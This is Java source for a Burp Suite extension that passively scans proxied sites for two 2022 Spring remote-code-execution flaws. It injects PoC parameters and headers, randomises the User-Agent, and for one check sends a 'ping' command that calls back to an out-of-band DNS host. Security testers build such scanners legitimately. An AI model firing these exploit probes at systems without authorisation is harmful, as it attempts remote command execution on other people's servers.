package burp.scan;

import burp.*;
import burp.backend.IBackend;
import burp.backend.platform.BurpCollaboratorClient;
import burp.backend.platform.Ceye;
import burp.backend.platform.Dnslog;
import burp.payload.IPoc;
import burp.ui.tabs.SettingUi;
import burp.util.RandomHeaders;
import burp.util.Utils;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.*;

/**
 * @author : metaStor
 * @date : Created 2022/4/7
 * @description: 主动/被动扫描
 * */
public class Scanner implements IScannerCheck {

    public BurpExtender burpExtender;
    private IExtensionHelpers helpers;

    // 静态文件后缀
    private final String[] STATIC_FILE_EXT = new String[]{
            "png",
            "jpg",
            "jpeg",
            "gif",
            "pdf",
            "bmp",
            "js",
            "css",
            "ico",
            "woff",
            "woff2",
            "ttf",
            "otf",
            "ttc",
            "svg",
            "psd",
            "exe",
            "zip",
            "rar",
            "7z",
            "msi",
            "tar",
            "gz",
            "mp3",
            "mp4",
            "mkv",
            "swf",
            "xls",
            "xlsx",
            "doc",
            "docx",
            "ppt",
            "pptx",
            "iso"
    };

    // 存放每次同类uri的md5, 防止重复扫描
    private final Set<String> allScan = new HashSet<String>();

    // POCS
    private IPoc[] pocs;

    // Backend platform
    private IBackend backend = null;

    // 定时任务
    private Timer timer;

    public Scanner(BurpExtender burpExtender) {
        // 获取父类的操作类
        this.burpExtender = burpExtender;
        this.helpers = this.burpExtender.helpers;
        this.timer = new Timer();
        // 初始化pocs
        this.pocs = Utils.getPocs(new Integer[]{1, 2, 3, 4, 5});
    }

    /**
     * 只做被动扫描
     */
    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse iHttpRequestResponse) {
        // 插件是否开启
        if(!this.burpExtender.tags.getSettingUi().isEnable()) return null;
        // 初始化回连平台
        this.initBackend();
        // vul?
        boolean isVul = false;

        List<IScanIssue> issues = new ArrayList<IScanIssue>();
        IRequestInfo requestInfo = this.helpers.analyzeRequest(iHttpRequestResponse);
        IResponseInfo responseInfo = this.helpers.analyzeResponse(iHttpRequestResponse.getResponse());
        String url = String.valueOf(requestInfo.getUrl());
        String url_md5 = normalized(requestInfo);
        if (!this.isStaticFile(url) && !this.isChecked(url_md5)) {  // 跳过静态文件和同类uri
            this.burpExtender.stdout.println(String.format("[*] Scanning %s", url));
            // 扫描任务状态添加到UI
            int id = this.burpExtender.tags.getScannerUi().add(
                    "ALL",
                    requestInfo.getMethod(),
                    url,
                    String.valueOf(this.helpers.analyzeResponse(iHttpRequestResponse.getResponse()).getStatusCode()),
                    "waiting for test results",
                    iHttpRequestResponse
            );
            /**
             * 报错扫描
             */
            if (this.burpExtender.tags.getSettingUi().isErrorCheck()) {
                // Spring Core RCE (CVE-2022-22965)
                if (responseInfo.getStatusCode() != 404) {  // 跳过404
                    IScanIssue errorIssue = this.errorScan(iHttpRequestResponse);
                    if (errorIssue != null) {
                        isVul = true;
                        this.burpExtender.stdout.println(String.format("[+] ErrorChecker found %s Vul!", url));
                        issues.add(errorIssue);
                        // 扫描结果输出到UI
                        this.burpExtender.tags.getScannerUi().save(
                                id,
                                "ErrorCheck",
                                this.burpExtender.helpers.analyzeRequest(errorIssue.getHttpMessages()[0]).getMethod(),
                                String.valueOf(this.burpExtender.helpers.analyzeRequest(errorIssue.getHttpMessages()[0]).getUrl()),
                                String.valueOf(this.helpers.analyzeResponse(errorIssue.getHttpMessages()[0].getResponse()).getStatusCode()),
                                "[+] SpringCore RCE",
                                errorIssue.getHttpMessages()[0]
                        );
                    }
                    // 已扫描uri的集合
                    this.allScan.add(url_md5);
                }
            }
            /**
             * 回连扫描
             */
            if (this.burpExtender.tags.getSettingUi().isReverseCheck()) {
                // Spring Core RCE (CVE-2022-22965)
                if (responseInfo.getStatusCode() != 404) {  // 跳过404
                    IScanIssue reverseIssue = this.reverseScan(iHttpRequestResponse);
                    if (reverseIssue != null) {
                        isVul = true;
                        this.burpExtender.stdout.println(String.format("[+] ReverseChecker found %s Vul!", url));
                        issues.add(reverseIssue);
                        // 扫描结果输出到UI
                        this.burpExtender.tags.getScannerUi().save(
                                id,
                                "ReverseCheck",
                                this.burpExtender.helpers.analyzeRequest(reverseIssue.getHttpMessages()[0]).getMethod(),
                                String.valueOf(this.burpExtender.helpers.analyzeRequest(reverseIssue.getHttpMessages()[0]).getUrl()),
                                String.valueOf(this.helpers.analyzeResponse(reverseIssue.getHttpMessages()[0].getResponse()).getStatusCode()),
                                "[+] Spring Core RCE",
                                reverseIssue.getHttpMessages()[0]
                        );
                    }
                    // 已扫描uri的集合
                    this.allScan.add(url_md5);
                }
                // Spring Cloud Function SpEL RCE (CVE-2022-22963)
                IScanIssue spelIssue = this.CloudFunctionSpelRCE(iHttpRequestResponse);
                if (spelIssue != null) {
                    isVul = true;
                    this.burpExtender.stdout.println(String.format("[+] ReverseChecker found %s Vul!", url));
                    issues.add(spelIssue);
                    // 扫描结果输出到UI
                    this.burpExtender.tags.getScannerUi().save(
                            id,
                            "ReverseCheck",
                            this.burpExtender.helpers.analyzeRequest(spelIssue.getHttpMessages()[0]).getMethod(),
                            String.valueOf(this.burpExtender.helpers.analyzeRequest(spelIssue.getHttpMessages()[0]).getUrl()),
                            String.valueOf(this.helpers.analyzeResponse(spelIssue.getHttpMessages()[0].getResponse()).getStatusCode()),
                            "[+] Spring Cloud Function SpEL RCE",
                            spelIssue.getHttpMessages()[0]
                    );
                }
            }
            // 不存在漏洞, 更新UI
            if (!isVul) {
                this.burpExtender.tags.getScannerUi().save(
                        id,
                        "ALL",
                        requestInfo.getMethod(),
                        String.valueOf(requestInfo.getUrl()),
                        String.valueOf(this.helpers.analyzeResponse(iHttpRequestResponse.getResponse()).getStatusCode()),
                        "[-] Not Found Spring RCE",
                        iHttpRequestResponse
                );
                this.burpExtender.stdout.println(String.format("[-] No Vul %s", url));
            }
        } else {
            this.burpExtender.stdout.println(String.format("[-] Pass %s", url));
        }
        return issues;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse iHttpRequestResponse, IScannerInsertionPoint iScannerInsertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue iScanIssue, IScanIssue iScanIssue1) {
        return 0;
    }

    private void initBackend() {
        // 回连平台初始化
        SettingUi.Backends backendSelected = this.burpExtender.tags.getSettingUi().getBackendPlatform();
        switch (backendSelected) {
            case Dnslog:
                this.backend = new Dnslog(this.burpExtender.callbacks);
                break;
            case BurpCollaborator:
                this.backend = new BurpCollaboratorClient(this.burpExtender.callbacks);
                break;
            case Ceye:
                this.backend = new Ceye(this.burpExtender.callbacks, this.burpExtender);
                break;  // 待实现
        }
        if (this.backend == null) {
//            this.burpExtender.stdout.println("[+] Load Scanner successfully!");
            this.burpExtender.stderr.println("[-] Fail to load Scanner.");
        }
    }

    /**
     * 使用POC1/POC2进行报错检测漏洞
     * @param httpRequestResponse
     * @return SpringCoreIssue
     */
    private IScanIssue errorScan(IHttpRequestResponse httpRequestResponse) {
        byte[] newHeaderRequest = this.randomHeader(httpRequestResponse);  // 随机Agent-User头
//        this.burpExtender.stdout.println(Utils.bytes2Hex(newHeaderRequest));
        IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
        String method = requestInfo.getMethod();

        // 验证poc1
        IPoc poc1 = this.pocs[0];
        String[] poc11 = poc1.genPoc().split("=");
        String key = poc11[0];
        String value = String.format(poc11[1], Utils.randomStr(3));
        String value2 = String.format(poc11[1], "false");
        // 将poc作为新参数加入请求中
        IParameter newParam = this.helpers.buildParameter(key, value, ("GET".equalsIgnoreCase(method)) ? IParameter.PARAM_URL : IParameter.PARAM_BODY);
        IHttpRequestResponse requestResponse1 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), this.helpers.addParameter(newHeaderRequest, newParam));
        IResponseInfo response1 = this.helpers.analyzeResponse(requestResponse1.getResponse());
        // 第一次请求为报错状态码,
        if (this.isErrorStatusCode(response1.getStatusCode())) {
            newParam = this.helpers.buildParameter(key, value2, ("GET".equalsIgnoreCase(method)) ? IParameter.PARAM_URL : IParameter.PARAM_BODY);
            IHttpRequestResponse requestResponse2 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), this.helpers.addParameter(newHeaderRequest, newParam));
            IResponseInfo response2 = this.helpers.analyzeResponse(requestResponse2.getResponse());
            // 第二次正常请求，防止扫到原本就报错的站
            if (!this.isErrorStatusCode(response2.getStatusCode())) {
                return new SpringIssue(
                        requestInfo.getUrl(),
                        "Spring Core RCE",
                        0,
                        "High",
                        "Certain",
                        null,
                        null,
                        newParam.getName() + "=" + newParam.getValue(),
                        null,
                        new IHttpRequestResponse[]{requestResponse2},
                        requestResponse2.getHttpService()
                );
            }
        }

        // 验证poc2
        IPoc poc2 = this.pocs[1];
        String[] poc22 = poc2.genPoc().split("=");
        String ranStr = Utils.randomStr(3);
        key = String.format(poc22[0], ranStr);
        value = String.format(poc22[1], ranStr);

        newHeaderRequest = this.randomHeader(httpRequestResponse);  // 随机header
        newParam = this.helpers.buildParameter(key, value, ("GET".equalsIgnoreCase(method)) ? IParameter.PARAM_URL : IParameter.PARAM_BODY);
        requestResponse1 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), this.helpers.addParameter(newHeaderRequest, newParam));
        response1 = this.helpers.analyzeResponse(requestResponse1.getResponse());
        // 第一次请求为报错状态码
        if (this.isErrorStatusCode(response1.getStatusCode())) {
            // 与正常请求比较，防止扫到原本就报错的站
            if (!this.isErrorStatusCode(this.burpExtender.helpers.analyzeResponse(httpRequestResponse.getResponse()).getStatusCode())) {
                return new SpringIssue(
                        requestInfo.getUrl(),
                        "Spring Core RCE",
                        0,
                        "High",
                        "UnCertain",
                        null,
                        null,
                        newParam.getName() + "=" + newParam.getValue(),
                        null,
                        new IHttpRequestResponse[]{requestResponse1},
                        requestResponse1.getHttpService()
                );
            }
        }
        return null;
    }

    /**
     * 使用POC3进行回连检测漏洞
     * @param httpRequestResponse
     * @return SpringCoreIssue
     */
    private IScanIssue reverseScan(IHttpRequestResponse httpRequestResponse) {
        byte[] newHeaderRequest = this.randomHeader(httpRequestResponse);  // 随机Agent-User头
        IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
        String method = requestInfo.getMethod();
        String payload = this.backend.generatePayload();

        // poc3
        IPoc poc3 = this.pocs[2];
        String[] poc33 = poc3.genPoc().split("&");
        String key1 = poc33[0].split("=")[0];
        String value1 = String.format(poc33[0].split("=")[1], payload, Utils.randomStr(4));
        String key2 = String.format(poc33[1].split("=")[0], Utils.randomStr(2));
        String value2 = String.format(poc33[1].split("=")[1], Utils.randomStr(2));
        // 构造参数
        IParameter param1 = this.helpers.buildParameter(key1, value1, ("GET".equalsIgnoreCase(method)) ? IParameter.PARAM_URL : IParameter.PARAM_BODY);
        IParameter param2 = this.helpers.buildParameter(key2, value2, ("GET".equalsIgnoreCase(method)) ? IParameter.PARAM_URL : IParameter.PARAM_BODY);
        byte[] newParamsReq = this.helpers.addParameter(newHeaderRequest, param1);
        newParamsReq = this.helpers.addParameter(newParamsReq, param2);
        IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), newParamsReq);
        // 请求是否被ban
        if (requestResponse.getResponse() != null) {
            this.burpExtender.stdout.println("[*] Reverse Checking Spring Core RCE for: " + requestInfo.getUrl().toString() + " ...");
            // 5min内查看是否回连
            for (int i = 0; i < 10; i++) {
//                this.burpExtender.stdout.println("[-] No." + i + " Checking " + requestInfo.getUrl().toString());
                if (this.backend.checkResult(payload)) {
                    return new SpringIssue(
                            requestInfo.getUrl(),
                            "Spring Core RCE",
                            0,
                            "High",
                            "Certain",
                            null,
                            null,
                            key1 + "=" + value1 + "&" + key2 + "=" + value2,
                            null,
                            new IHttpRequestResponse[]{requestResponse},
                            requestResponse.getHttpService()
                    );
                }
                try {
                    Thread.sleep(30 * 1000);  // sleep 30s
                } catch (InterruptedException e) {
                    this.burpExtender.stderr.println(e.getMessage());
                }
            }
        }
        return null;
    }

    /**
     * Spring Cloud Function SpEL RCE (CVE-2022-22963)
     * @param httpRequestResponse
     * @return IScanIssue
     */
    private IScanIssue CloudFunctionSpelRCE(IHttpRequestResponse httpRequestResponse) {
        boolean is500 = false;  // 是否打到500响应
        byte[] newHeaderRequest = this.randomHeader(httpRequestResponse);  // 随机Agent-User头
        IHttpService httpService = httpRequestResponse.getHttpService();
        IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
        String payload = this.backend.generatePayload();

        // poc4/5
        IPoc poc4 = this.pocs[3];
        IPoc poc5 = this.pocs[4];
        String[] poc44 = poc4.genPoc().split(":");
        // poc4 => key:value
        // poc5 => key:value2
        String key = poc44[0];
        String value = String.format(poc44[1], payload);
        String value2 = String.format(poc5.genPoc().split(":")[1], "ping " + payload);
        // headers加入poc
        byte[] poc4Request = this.CloudFunctionSpelPOC(httpRequestResponse, key, value);
        byte[] poc5Request = this.CloudFunctionSpelPOC(httpRequestResponse, key, value2);
        try {
            // 打当前uri
            IHttpRequestResponse httpRequestResponse1 = this.burpExtender.callbacks.makeHttpRequest(httpService, poc4Request);
            IHttpRequestResponse httpRequestResponse2 = this.burpExtender.callbacks.makeHttpRequest(httpService, poc5Request);
            // 打到500就检测回连
            is500 = this.helpers.analyzeResponse(httpRequestResponse1.getResponse()).getStatusCode() == 500 || this.helpers.analyzeResponse(httpRequestResponse2.getResponse()).getStatusCode() == 500;
            requestInfo = this.helpers.analyzeRequest(httpRequestResponse2);  // record 数据包

            // 打默认路由/functionRouter
            byte[] frRequest = this.helpers.buildHttpRequest(new URL(httpService.getProtocol(), httpService.getHost(), httpService.getPort(), "/functionRouter"));
            IHttpRequestResponse frRequestResponse = this.burpExtender.callbacks.makeHttpRequest(httpService, frRequest);
            // 是否存在默认路由
            if (this.helpers.analyzeResponse(frRequestResponse.getResponse()).getStatusCode() != 404) {
                poc4Request = this.CloudFunctionSpelPOC(frRequestResponse, key, value);
                poc5Request = this.CloudFunctionSpelPOC(frRequestResponse, key, value2);
                httpRequestResponse1 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), poc4Request);
                httpRequestResponse2 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), poc5Request);
                requestInfo = this.helpers.analyzeRequest(httpRequestResponse2);  // record 数据包
                // 打到500就检测回连
                is500 = this.helpers.analyzeResponse(httpRequestResponse1.getResponse()).getStatusCode() == 500 || this.helpers.analyzeResponse(httpRequestResponse2.getResponse()).getStatusCode() == 500;
            }
            // 打完check poc再检测是否回连
            if (is500) {
                this.burpExtender.stdout.println("[*] Reverse Checking Spring Cloud Function SpEL RCE for: " + requestInfo.getUrl().toString() + " ...");
                // 5min内查看是否回连
                for (int i = 0; i < 10; i++) {
//                    this.burpExtender.stdout.println("[-] No." + i + " Checking Spring Cloud Function SpEL RCE for: " + requestInfo.getUrl().toString());
                    if (this.backend.checkResult(payload)) {
                        return new SpringIssue(
                                requestInfo.getUrl(),
                                "Spring Cloud Function SpEL RCE",
                                0,
                                "High",
                                "Certain",
                                null,
                                null,
                                "(Maybe) URI: /functionRouter\n" + "Headers: " + key + ":" + value + "\nor\n" + key + ":" + value2,
                                null,
                                new IHttpRequestResponse[]{httpRequestResponse2},
                                httpRequestResponse2.getHttpService()
                        );
                    }
                    try {
                        Thread.sleep(30 * 1000);  // sleep 30s
                    } catch (InterruptedException e) {
                        this.burpExtender.stderr.println(e.getMessage());
                    }
                }
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
            this.burpExtender.stderr.println(e.getMessage());
        }
        return null;
    }

    /**
     * 生成CloudFunctionSpel POC
     * 1. 将key:value作为poc插入到headers中
     * 2. 改GET为POST请求
     * 3. POST内容随机
     * @param httpRequestResponse
     * @param key
     * @param value
     * @return pocRequest
     */
    private byte[] CloudFunctionSpelPOC(IHttpRequestResponse httpRequestResponse, String key, String value) {
        try {
            IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
            byte[] rawRequest = httpRequestResponse.getRequest();
            List<String> headers = requestInfo.getHeaders();
            headers.add(key + ":" + value);
            headers.set(0, headers.get(0).replace("GET", "POST"));
            headers.removeIf(header -> header != null && header.toLowerCase().startsWith("content-type:"));
            headers.add("Content-type: application/x-www-form-urlencoded");
            rawRequest = new String(rawRequest).substring(requestInfo.getBodyOffset()).getBytes();
            IParameter param = this.helpers.buildParameter(Utils.randomStr(6), "1", IParameter.PARAM_BODY);
            return this.helpers.addParameter(this.helpers.buildHttpMessage(headers, rawRequest), param);
        } catch (Exception e) {
            e.printStackTrace();
            this.burpExtender.stderr.println(e.getMessage());
            return null;
        }
    }

    /**
     * 随机Agent头
     * 先将原来的Agent删掉，再添加随机Agent
     * @param httpRequestResponse
     * @return
     */
    private byte[] randomHeader(IHttpRequestResponse httpRequestResponse) {
        IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
        byte[] rawRequest = httpRequestResponse.getRequest();
        List<String> headers = requestInfo.getHeaders();
        // 先删除User-Agent，再添加随机的User-Agent
        for (String header: headers) {
//            this.burpExtender.stdout.println("header " + header);
            if (header.startsWith("User-Agent")) {  // 坑点: 带冒号匹配会报错
                headers.remove(header);
                headers.add("User-Agent: " + RandomHeaders.randomHeader());
                break;
            }
        }
        // 获取body
        byte[] bodyRequest = new String(rawRequest).substring(requestInfo.getBodyOffset()).getBytes();
        // 拼接header和body
        return this.helpers.buildHttpMessage(headers, bodyRequest);
    }

    /**
     * 判断uri是否静态文件,
     * 使用传统的循环判断，时间复杂度为O(1)
     * @param url
     * @return true/false
     */
    private boolean isStaticFile(String url) {
        for (String ext : this.STATIC_FILE_EXT) {
            if (ext.equalsIgnoreCase(Utils.getUriExt(url))) return true;
        }
        return false;
    }

    /**
     * 归一化请求包
     * 格式: ${url} + GET/POST
     * @param requestInfo
     * @return MD5
     */
    private String normalized(IRequestInfo requestInfo) {
        String type = requestInfo.getMethod();
        String url = String.valueOf(requestInfo.getUrl()).split("\\?")[0];  // 获取?之前的url
        return Utils.MD5(url + "+" + type);
    }

    /**
     * 是否已扫描过
     * @param url_md5
     * @return
     */
    private boolean isChecked(String url_md5) {
        return this.allScan.contains(url_md5);
    }

    /**
     * 判断状态码是否是异常
     * 排除正常响应码: 200, 404，302
     * @param status_code
     * @return
     */
    private boolean isErrorStatusCode(int status_code) {
        return Arrays.stream(new Integer[]{200, 404, 302}).noneMatch(e -> e == status_code);
    }

    private IHttpRequestResponse requestWithHeaders() {

        return null;
    }

}
